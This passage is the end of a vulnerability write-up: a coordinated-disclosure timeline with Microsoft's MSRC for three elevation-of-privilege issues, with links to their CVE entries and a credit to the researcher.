2020-11-29: Sent an amendment to MSRC demonstrating the EoP impact of the vulnerabilities
2020-11-30: Case #62280 opened by MSRC 
2020-12-07: Behaviour confirmed by MSRC
2020-12-09: Risk assessment by MSRC completed with Severity: Important, Security Impact: Elevation of Privilege; no bounty rewarded (Out of scope: "Local vulnerabilities involving file path redirection through junctions or mountpoints")
2020-12-18: MSRC: "Would you mind keeping this issue confidential until Tuesday, April 13"?
2021-01-04: Report splitted into 3 dedicated cases by MSRC
2021-04-13: Publishing this write-up

## Links

- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28321

- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28322

- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28323


## Credits

[Imre Rad](https://www.linkedin.com/in/imre-rad-2358749b/)
